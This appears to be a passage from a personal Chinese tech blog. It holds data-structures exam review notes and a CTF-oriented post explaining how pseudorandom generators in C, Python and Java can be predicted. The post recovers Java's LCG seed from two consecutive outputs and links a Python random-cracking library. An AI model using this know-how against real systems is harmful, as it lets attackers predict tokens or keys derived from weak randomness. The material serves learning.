class="comment">//然后用新树的根指向原树的根</span></span><br></pre></td></tr></table></figure>
<h4 id="几个基本性质"><a href="#几个基本性质" class="headerlink" title="几个基本性质"></a>几个基本性质</h4><h4 id="会写三种遍历顺序"><a href="#会写三种遍历顺序" class="headerlink" title="会写三种遍历顺序"></a>会写三种遍历顺序</h4><p><a href="https://blog.csdn.net/u010521845/article/details/61413910" target="_blank" rel="noopener">https://blog.csdn.net/u010521845/article/details/61413910</a></p>
<h4 id="哈弗曼树的构造方法"><a href="#哈弗曼树的构造方法" class="headerlink" title="哈弗曼树的构造方法"></a>哈弗曼树的构造方法</h4><p><a href="https://blog.csdn.net/u010521845/article/details/61413910" target="_blank" rel="noopener">https://blog.csdn.net/u010521845/article/details/61413910</a></p>
<p>哈夫曼编码相比于next数组的构造，手算起来更加简单，老师好像讲过next数组也有一种手算的方法，然而。我好像忘了 gg</p>
<h3 id="图"><a href="#图" class="headerlink" title="图"></a>图</h3><p><a href="https://blog.csdn.net/weixin_42110638/article/details/84146813" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42110638/article/details/84146813</a></p>
<p>这是一个写的十分详细的介绍图的博客，以下介绍图的内容中有大部分是从中摘抄</p>
<h4 id="图的性质（连通图、连通分量、度等）"><a href="#图的性质（连通图、连通分量、度等）" class="headerlink" title="图的性质（连通图、连通分量、度等）"></a>图的性质（连通图、连通分量、度等）</h4><p>离散自己复习</p>
<h4 id="图的遍历"><a href="#图的遍历" class="headerlink" title="图的遍历"></a>图的遍历</h4><p>图的遍历图和树的遍历类似，那就是从图中某一顶点出发访遍图中其余顶点，且使每一个顶点仅被访问一次，这个过程就叫做图的遍历。</p>
<p>对于图的遍历来说，如何避免因回路陷入死循环，就需要科学地设计遍历方案，通过有两种遍历次序方案：深度优先遍历和广度优先遍历。</p>
<h6 id="深度优先遍历"><a href="#深度优先遍历" class="headerlink" title="深度优先遍历"></a>深度优先遍历</h6><p>深度优先遍历（Depth_First_Search）,也称为深度优先搜索，简称DFS。</p>
<p><img src="https://img-blog.csdnimg.cn/20181116230627808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjExMDYzOA==,size_16,color_FFFFFF,t_70" alt=""></p>
<p>为了更好的理解深度优先遍历。请看下面的图解：</p>
<p><img src="https://img-blog.csdnimg.cn/20181218175743769" alt=""></p>
<pre><code>//dfs算法
void Visit( Vertex V )

{
printf(&quot; %d&quot;, V);
}

void DFS( MGraph Graph, Vertex V, void (*Visit)(Vertex) )

{

Vertex j;
Visited[V] = true;//表示从V开始访问
Visit(V);//访问V，其实抛开题来讲这里一般都是打印V
for(j = 0;j &lt; Graph-&gt;Nv;j++)
{
    if(Graph-&gt;G[V][j] == 1 &amp;&amp; !Visited[j])//邻接矩阵等于1代表有边，此时如果还没被访问就递归调用
        DFS(Graph,j,Visit);
}


void DFS(int v)//邻接矩阵的dfs
{
    visited[v] = 1;
    cout&lt;&lt;v&lt;&lt;&quot; &quot;;
    for(int i = 0;i &lt; Nv;i++)
    {
        if((G[v][i] == 1) &amp;&amp; !visited[i])//邻接矩阵等于1代表有边(连通)，此时如果还没被访问就递归调用
            DFS(i);
    }
}
</code></pre><h5 id="广度优先遍历"><a href="#广度优先遍历" class="headerlink" title="广度优先遍历"></a>广度优先遍历</h5><p>广度优先遍历（Breadth_First_Search）,又称为广度优先搜索，简称BFS。</p>
<p><img src="https://img-blog.csdnimg.cn/20181116234319898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjExMDYzOA==,size_16,color_FFFFFF,t_70" alt=""></p>
<p><img src="https://img-blog.csdnimg.cn/20181218175743798" alt=""></p>
<h4 id="AOE网路"><a href="#AOE网路" class="headerlink" title="AOE网路"></a>AOE网路</h4><p><a href="https://blog.csdn.net/qq_38071429/article/details/80407544" target="_blank" rel="noopener">https://blog.csdn.net/qq_38071429/article/details/80407544</a></p>
<h4 id="拓扑排序"><a href="#拓扑排序" class="headerlink" title="拓扑排序"></a>拓扑排序</h4><p><a href="https://blog.csdn.net/weixin_42110638/article/details/84246833" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42110638/article/details/84246833</a></p>
<h4 id="关键路径"><a href="#关键路径" class="headerlink" title="关键路径"></a>关键路径</h4><p>见AOE网络 </p>
<h4 id="迪杰斯特拉算法"><a href="#迪杰斯特拉算法" class="headerlink" title="迪杰斯特拉算法"></a>迪杰斯特拉算法</h4><p><a href="https://blog.csdn.net/kprogram/article/details/81225176" target="_blank" rel="noopener">https://blog.csdn.net/kprogram/article/details/81225176</a></p>
<p>比较简单</p>
<h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><p>估计是我翘课了。我对这里没有印象</p>
<p>课件<a href="https://github.com/ppcrab/Learning_Resources/blob/master/%E7%AC%AC%E4%B9%9D%E7%AB%A0__%E6%9F%A5%E6%89%BE.ppsx" target="_blank" rel="noopener">https://github.com/ppcrab/Learning_Resources/blob/master/%E7%AC%AC%E4%B9%9D%E7%AB%A0__%E6%9F%A5%E6%89%BE.ppsx</a></p>
<h4 id="二叉排序树"><a href="#二叉排序树" class="headerlink" title="二叉排序树"></a>二叉排序树</h4><p><a href="https://blog.csdn.net/barkzhang/article/details/7776629" target="_blank" rel="noopener">https://blog.csdn.net/barkzhang/article/details/7776629</a></p>
<h4 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h4><p><a href="https://www.cnblogs.com/zhuli19901106/p/3802505.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhuli19901106/p/3802505.html</a></p>
<h4 id="哈希查找几种处理冲突的方法"><a href="#哈希查找几种处理冲突的方法" class="headerlink" title="哈希查找几种处理冲突的方法"></a>哈希查找几种处理冲突的方法</h4><p><a href="https://blog.csdn.net/Iamthedoctor123/article/details/79334800" target="_blank" rel="noopener">https://blog.csdn.net/Iamthedoctor123/article/details/79334800</a></p>
<h4 id="会计算等概率条件下平均查找长度"><a href="#会计算等概率条件下平均查找长度" class="headerlink" title="会计算等概率条件下平均查找长度"></a>会计算等概率条件下平均查找长度</h4><p><a href="https://blog.csdn.net/SunnyYoona/article/details/84686162" target="_blank" rel="noopener">https://blog.csdn.net/SunnyYoona/article/details/84686162</a></p>
<h3 id="内部排序"><a href="#内部排序" class="headerlink" title="内部排序"></a>内部排序</h3><p>这一部分网上的资料要零散，而且少，估计是太简单？反正讲课的时候只用了两三节课左右讲解这里，估计不是重点</p>
<p>课件<a href="https://github.com/ppcrab/Learning_Resources/blob/master/%E7%AC%AC%E5%8D%81%E7%AB%A0_%E5%86%85%E9%83%A8%E6%8E%92%E5%BA%8F.ppsx" target="_blank" rel="noopener">https://github.com/ppcrab/Learning_Resources/blob/master/%E7%AC%AC%E5%8D%81%E7%AB%A0_%E5%86%85%E9%83%A8%E6%8E%92%E5%BA%8F.ppsx</a></p>
<h4 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h4><p><a href="https://www.cnblogs.com/WJQ2017/p/8340156.html" target="_blank" rel="noopener">https://www.cnblogs.com/WJQ2017/p/8340156.html</a></p>
<p><a href="https://blog.csdn.net/weixin_34059951/article/details/87958541" target="_blank" rel="noopener">https://blog.csdn.net/weixin_34059951/article/details/87958541</a></p>
<h4 id="快速排序的划分"><a href="#快速排序的划分" class="headerlink" title="快速排序的划分"></a>快速排序的划分</h4><h4 id="快速排序划分的应用"><a href="#快速排序划分的应用" class="headerlink" title="快速排序划分的应用"></a>快速排序划分的应用</h4><h4 id="各种排序的时间复杂度"><a href="#各种排序的时间复杂度" class="headerlink" title="各种排序的时间复杂度"></a>各种排序的时间复杂度</h4><p><a href="https://blog.csdn.net/JxufeCarol/article/details/82825563" target="_blank" rel="noopener">https://blog.csdn.net/JxufeCarol/article/details/82825563</a>  </p>
<h3 id="其他参考资料网站"><a href="#其他参考资料网站" class="headerlink" title="其他参考资料网站"></a>其他参考资料网站</h3><p>总结博客：<a href="https://blog.csdn.net/u010521845/article/details/61413910" target="_blank" rel="noopener">https://blog.csdn.net/u010521845/article/details/61413910</a></p>
<p>有关题目<a href="https://wenku.baidu.com/view/33a07baa0242a8956bece4e4.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/33a07baa0242a8956bece4e4.html</a></p>
<p><a href="https://wenku.baidu.com/view/6a4ac8dcdc88d0d233d4b14e852458fb770b38bb.html" target="_blank" rel="noopener">https://wenku.baidu.com/view/6a4ac8dcdc88d0d233d4b14e852458fb770b38bb.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/05/28/随机数的破解相关/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/photo/hello.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/05/28/随机数的破解相关/" itemprop="url">随机数的破解相关</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-05-28T13:00:55+08:00">
                2019-05-28
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  1.1k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  4
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>2019强网杯中出现了随机数相关的题目，准备整理一波与随机数有关的题目。</p>
<h3 id="随机数简介"><a href="#随机数简介" class="headerlink" title="随机数简介"></a>随机数简介</h3><p>对于常见的随机数来说，有C，python，java等。准确的说这些随机数是伪随机数。因为他们往往是随着随机数种子的不同才会产生不同的序列。所以说，只要我们能控制随机数种子，我们就能知道随之而来的随机数序列。随机数也就不再随机了。</p>
<p>相比较而言<a href="http://kuanghy.github.io/2015/12/30/dev-random" target="_blank" rel="noopener"> linux下的/dev/urandom以及/dev/random</a>更像是随机数。</p>
<h3 id="各种语言随机数实现"><a href="#各种语言随机数实现" class="headerlink" title="各种语言随机数实现"></a>各种语言随机数实现</h3><h4 id="C语言"><a href="#C语言" class="headerlink" title="C语言"></a>C语言</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">( <span class="keyword">void</span> )</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="keyword">int</span> i;</span><br><span class="line">srand( (<span class="keyword">unsigned</span>)time( <span class="literal">NULL</span> ) );          <span class="comment">//初始化随机数</span></span><br><span class="line">    <span class="keyword">for</span>( i = <span class="number">0</span>; i &lt; <span class="number">10</span>;i++ )                          <span class="comment">//打印出10个随机数</span></span><br><span class="line">          <span class="built_in">printf</span>( <span class="string">"%d\n"</span>, rand() );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里面采用的随机数种子是利用时间进行的，这样的话，每次程序的运行就会有不同的随机数产生。</p>
<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">random.seed(int(time.time()))</span><br><span class="line">recv = random.randint(<span class="number">0</span>,<span class="number">2</span>**<span class="number">64</span>)</span><br></pre></td></tr></table></figure>
<p>我之前以为<a href="https://www.jianshu.com/p/be588891aace" target="_blank" rel="noopener">python 产生的随机数</a>应该是和C一样的。但是现在看来好像并非如此。我记的之前还用过来着。。。。</p>
<p>忘了，反正python 的random库功能确实多。不愧是python</p>
<h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><p><a href="https://www.cnblogs.com/skywang12345/p/3341423.html" target="_blank" rel="noopener">java的随机数</a>有点多，第二种和python的很像。第三种则是最常见的。</p>
<h3 id="随机数的破解"><a href="#随机数的破解" class="headerlink" title="随机数的破解"></a>随机数的破解</h3><h4 id="pwn题目中的破解"><a href="#pwn题目中的破解" class="headerlink" title="pwn题目中的破解"></a>pwn题目中的破解</h4><p>在pwn题目中也会出现随机数这个东西，常常会使用随机数充当地址或者说是判断的标志。</p>
<p>通常我们需要做的是覆盖随机数种子，因为如果我们可以控制随机数的种子，那么这个随机数序列也就不再是随机的了。then，如果使用的随机数是上文提到的urandom的话，那就要看能否更改随机数产生后的一些东西了。或者说别往随机数这里想，基本上没啥戏了。</p>
<p>总的来说，我暂时没有遇到什么比较深的利用。</p>
<h4 id="java随机数的破解"><a href="#java随机数的破解" class="headerlink" title="java随机数的破解"></a>java随机数的破解</h4><p>java随机数的产生是利用了一个经典的算法 LCG，也就是线性同余法。</p>
<h5 id="上文提到的第一种产生方式"><a href="#上文提到的第一种产生方式" class="headerlink" title="上文提到的第一种产生方式"></a>上文提到的第一种产生方式</h5><p>时间就是种子</p>
<h5 id="上文提到的第二种随机数产生的方式"><a href="#上文提到的第二种随机数产生的方式" class="headerlink" title="上文提到的第二种随机数产生的方式"></a>上文提到的第二种随机数产生的方式</h5><p>Math.random</p>
<p>实际上是在内部调用java.util.Random()的，他有一个致命的弱点，它和系统时间有关，也就是说在相隔时间很短的两个random很有可能会得到两个相同的一模一样的double。</p>
<h5 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h5><p>先来看一下java中Random类干了些什么</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment">     * Creates a new random number generator. This constructor sets </span></span><br><span class="line"><span class="comment">     * the seed of the random number generator to a value very likely </span></span><br><span class="line"><span class="comment">     * to be distinct from any other invocation of this constructor. </span></span><br><span class="line"><span class="comment">     */</span>  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Random</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">this</span>(seedUniquifier() ^ System.nanoTime());  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">long</span> <span class="title">seedUniquifier</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">        <span class="comment">// L'Ecuyer, "Tables of Linear Congruential Generators of  </span></span><br><span class="line">        <span class="comment">// Different Sizes and Good Lattice Structure", 1999  </span></span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;  </span><br><span class="line">            <span class="keyword">long</span> current = seedUniquifier.get();  </span><br><span class="line">            <span class="keyword">long</span> next = current * <span class="number">181783497276652981L</span>;  </span><br><span class="line">            <span class="keyword">if</span> (seedUniquifier.compareAndSet(current, next))  </span><br><span class="line">                <span class="keyword">return</span> next;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> AtomicLong seedUniquifier  </span><br><span class="line">        = <span class="keyword">new</span> AtomicLong(<span class="number">8682522807148012L</span>);  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Random</span><span class="params">(<span class="keyword">long</span> seed)</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">if</span> (getClass() == Random.class)  </span><br><span class="line">            <span class="keyword">this</span>.seed = <span class="keyword">new</span> AtomicLong(initialScramble(seed));  </span><br><span class="line">        <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="comment">// subclass might have overriden setSeed  </span></span><br><span class="line">            <span class="keyword">this</span>.seed = <span class="keyword">new</span> AtomicLong();  </span><br><span class="line">            setSeed(seed);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">long</span> <span class="title">initialScramble</span><span class="params">(<span class="keyword">long</span> seed)</span> </span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> (seed ^ multiplier) &amp; mask;  </span><br><span class="line">    &#125;  </span><br><span class="line">    。。。</span><br></pre></td></tr></table></figure>
<p>各种骚操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public int nextInt() &#123;  </span><br><span class="line">    return next(32);  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">protected int next(int bits) &#123;  </span><br><span class="line">    long oldseed, nextseed;  </span><br><span class="line">    AtomicLong seed = this.seed;  </span><br><span class="line">    do &#123;  </span><br><span class="line">        oldseed = seed.get();  </span><br><span class="line">        nextseed = (oldseed * multiplier + addend) &amp; mask;  //线性同余</span><br><span class="line">    &#125; while (!seed.compareAndSet(oldseed, nextseed));  </span><br><span class="line">    return (int)(nextseed &gt;&gt;&gt; (48 - bits));  //有个右移操作</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实际上</p>
<p>[ <img src="/2019/05/28/随机数的破解相关/捕获.PNG" alt="捕获">]</p>
<p>我们已经知道了所需要的参数</p>
<p>所以我们完全可以使用暴力破解的方式得到没有进行右移操作之前的数，从而得到seed</p>
<p>简单的说就是已经知道了两个相邻的随机数，我们可以预测这一串随机数。</p>
<p><img src="https://cy-pic.kuaizhan.com/g3/9a/c0/dbe5-cb0c-4234-b884-8d721e590fd371" alt="https://cy-pic.kuaizhan.com/g3/9a/c0/dbe5-cb0c-4234-b884-8d721e590fd371"></p>
<h4 id="python-random的破解"><a href="#python-random的破解" class="headerlink" title="python random的破解"></a>python random的破解</h4><p>已经有大佬搞了个库，膜</p>
<p><a href="https://github.com/tna0y/Python-random-module-cracker/blob/master/README.md" target="_blank" rel="noopener">https://github.com/tna0y/Python-random-module-cracker/blob/master/README.md</a></p>
<p>俺要去看看具体咋写的，不做脚本小子，gg</p>
<h3 id="线性同余算法的破解"><a href="#线性同余算法的破解" class="headerlink" title="线性同余算法的破解"></a>线性同余算法的破解</h3><p>实际上，这是一种十分不安全的算法，由于有大佬做的博客十分详细，我就不再重复的造轮子了。gg</p>
<p>甚是详细</p>
<p><a href="http://zeroyu.xyz/2018/11/02/Cracking-LCG/" target="_blank" rel="noopener">http://zeroyu.xyz/2018/11/02/Cracking-LCG/</a></p>
<p>gcd算法自己搞就好，望上一搜一堆</p>
<h3 id="本文参考链接："><a href="#本文参考链接：" class="headerlink" title="本文参考链接："></a>本文参考链接：</h3><p><a href="https://blog.csdn.net/angelkeepmoving/article/details/52191857" target="_blank" rel="noopener">https://blog.csdn.net/angelkeepmoving/article/details/52191857</a></p>
<p><a href="https://t1174779123.iteye.com/blog/2037719" target="_blank" rel="noopener">https://t1174779123.iteye.com/blog/2037719</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/photo/hello.jpg"
                alt="John Doe" />
            
              <p class="site-author-name" itemprop="name">John Doe</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">35</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">1</span>
                  <span class="site-state-item-name">tags</span>
                
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://oj.blue-whale.me" target="_blank" title="Blue_Whaleoj">
                      
                        <i class="fa fa-fw fa-globe"></i>Blue_Whaleoj</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://bleachz.github.io/" target="_blank" title="DALAO">
                      
                        <i class="fa fa-fw fa-globe"></i>DALAO</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">23.6k</span>
  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  




  

  
</body>
</html>
